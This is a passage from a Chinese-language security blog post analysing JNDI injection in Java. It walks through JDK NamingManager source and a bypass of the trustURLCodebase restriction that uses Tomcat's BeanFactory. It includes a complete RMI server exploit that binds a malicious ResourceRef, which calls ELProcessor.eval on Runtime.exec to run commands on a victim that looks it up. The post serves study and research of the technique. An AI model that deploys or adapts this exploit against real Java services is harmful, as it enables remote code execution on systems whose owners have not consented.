var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;<span class="comment">//限制点，如果trustURLCodebase为false,则会检测是否设置了传入的Reference是否设置了classFactoryLocation</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="javax-naming-spi-NamingManager-java"><a href="#javax-naming-spi-NamingManager-java" class="headerlink" title="javax\naming\spi\NamingManager.java"></a>javax\naming\spi\NamingManager.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object</span></span><br><span class="line"><span class="function">        <span class="title">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">                          Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">.....</span><br><span class="line">            Reference ref = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//如果传入的是refer进入</span></span><br><span class="line">            String f = ref.getFactoryClassName();<span class="comment">//调用了获得类的getFactoryClassName方法</span></span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line">&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">        InstantiationException,</span></span><br><span class="line"><span class="function">        MalformedURLException </span>&#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);<span class="comment">//尝试本地加载</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);<span class="comment">// 尝试远程类，最后实现是通过 Class.forName(className, true, cl)，其中cl为自定义 URLClassLoader</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;<span class="comment">//强转为ObjectFactory类型</span></span><br><span class="line">    &#125;              </span><br></pre></td></tr></table></figure>
<h4 id="基于BeanFactory的任意方法调用-tomcat依赖包-lt-8-5-85"><a href="#基于BeanFactory的任意方法调用-tomcat依赖包-lt-8-5-85" class="headerlink" title="基于BeanFactory的任意方法调用( tomcat依赖包&lt;8.5.85)"></a>基于BeanFactory的任意方法调用( tomcat依赖包&lt;8.5.85)</h4><p>在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 <strong>javax.naming.spi.ObjectFactory</strong> 接口，并且至少存在一个 <strong>getObjectInstance()</strong> 方法(当然远程类加载时用的Class.forName(className, true, cl)可以加载静态代码块，且在前面，后面报错了也没事)</p>
<p><strong>org.apache.naming.factory.BeanFactory</strong> 刚好满足条件并且存在被利用的可能。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用代码</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMI_Server_ByPass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;Tomcat8bypass&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line"> <span class="comment">//实际上就相当于运行java.lang.Object javax.el.ELProcessor.eval(Runtime.getRuntime().exec(&quot;calc&quot;))</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="ResourceRef-java"><a href="#ResourceRef-java" class="headerlink" title="ResourceRef.java"></a>ResourceRef.java</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceRef</span> <span class="keyword">extends</span> <span class="title">Reference</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ResourceRef</span><span class="params">(String resourceClass, String description,</span></span></span><br><span class="line"><span class="params"><span class="function">                       String scope, String auth, <span class="keyword">boolean</span> singleton,</span></span></span><br><span class="line"><span class="params"><span class="function">                       String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(resourceClass, factory, factoryLocation);<span class="comment">//调用Reference的构造方法</span></span><br><span class="line">        StringRefAddr refAddr = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (description != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refAddr = <span class="keyword">new</span> StringRefAddr(DESCRIPTION, description);</span><br><span class="line">            add(refAddr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (scope != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refAddr = <span class="keyword">new</span> StringRefAddr(SCOPE, scope);</span><br><span class="line">            add(refAddr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (auth != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refAddr = <span class="keyword">new</span> StringRefAddr(AUTH, auth);</span><br><span class="line">            add(refAddr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// singleton is a boolean so slightly different handling</span></span><br><span class="line">        refAddr = <span class="keyword">new</span> StringRefAddr(SINGLETON, Boolean.toString(singleton));</span><br><span class="line">        add(refAddr);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//下面是从Reference继承过来的</span></span><br><span class="line">    <span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(RefAddr addr)</span> </span>&#123;</span><br><span class="line">        addrs.addElement(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> RefAddr <span class="title">get</span><span class="params">(String addrType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = addrs.size();</span><br><span class="line">        RefAddr addr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            addr = addrs.elementAt(i);</span><br><span class="line">            <span class="keyword">if</span> (addr.getType().compareTo(addrType) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> addr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Enumeration&lt;RefAddr&gt; <span class="title">getAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addrs.elements();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//javax/naming/StringRefAddr.java</span></span><br><span class="line">    <span class="keyword">protected</span> String addrType;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StringRefAddr</span><span class="params">(String addrType, String addr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(addrType);<span class="comment">//赋给addrType</span></span><br><span class="line">        contents = addr;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addrType;</span><br><span class="line">    &#125; </span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> contents;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>
<h6 id="org-apache-naming-factory-BeanFactory-java"><a href="#org-apache-naming-factory-BeanFactory-java" class="headerlink" title="org/apache/naming/factory/BeanFactory.java"></a>org/apache/naming/factory/BeanFactory.java</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanFactory</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;<span class="comment">//检测是否为ResourceRef</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Reference ref = (Reference) obj;<span class="comment">//转成Reference</span></span><br><span class="line">                String beanClassName = ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br><span class="line">                ClassLoader tcl =</span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);                           <span class="comment">//1.根据自定义类名加载类</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              .....</span><br><span class="line">                Object bean = beanClass.newInstance();                                      <span class="comment">//2.实例化该类</span></span><br><span class="line">                RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);<span class="comment">//查找addrType的值为forceString的RefAddr</span></span><br><span class="line">                Map&lt;String, Method&gt; forced = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">                String value;  </span><br><span class="line">                <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    value = (String)ra.getContent();  </span><br><span class="line">                    Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> Class[<span class="number">1</span>];</span><br><span class="line">                    paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line">                    String setterName;</span><br><span class="line">                    <span class="keyword">int</span> index;</span><br><span class="line">                <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">                        param = param.trim();</span><br><span class="line">                        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            setterName = param.substring(index + <span class="number">1</span>).trim();<span class="comment">//按=分隔值和键</span></span><br><span class="line">                            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                        &#125;    </span><br><span class="line">                .....</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            forced.put(param, beanClass.getMethod(setterName, paramTypes));<span class="comment">//3.利用方法名和参数列表获取方法,并将结果放到一个map中</span></span><br><span class="line">                        &#125; </span><br><span class="line">                .....</span><br><span class="line">                Enumeration&lt;RefAddr&gt; e = ref.getAll();<span class="comment">//获取所以的RefAddr</span></span><br><span class="line">                <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">                    ra = e.nextElement();</span><br><span class="line">                    String propName = ra.getType();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;scope&quot;</span>) || propName.equals(<span class="string">&quot;auth&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;forceString&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;singleton&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="comment">//根据addrType值筛选出符合条件的RefAddr(本例是最后一个RefAddr)</span></span><br><span class="line">                    value = (String)ra.getContent();</span><br><span class="line">                    Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">                    Method method = forced.get(propName);         <span class="comment">//根据addrType值从map中提取方法         </span></span><br><span class="line">                    <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            method.invoke(bean, valueArray);                                <span class="comment">//4.调用函数                           </span></span><br></pre></td></tr></table></figure>
<p>抛开各种逻辑限制不谈，这里的利用其实就是通过反射实现任意方法调用，这里<strong>要求要调用的类可以通过无参构造，调用的方法的参数数目为一且是String类型</strong></p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/09/16/java/java%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20/" rel="prev" title="java fastjson反序列化">
                  <i class="fa fa-chevron-left"></i> java fastjson反序列化
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/10/16/java/javaweb%20%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="javaweb 内存马">
                  javaweb 内存马 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">mayylu</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
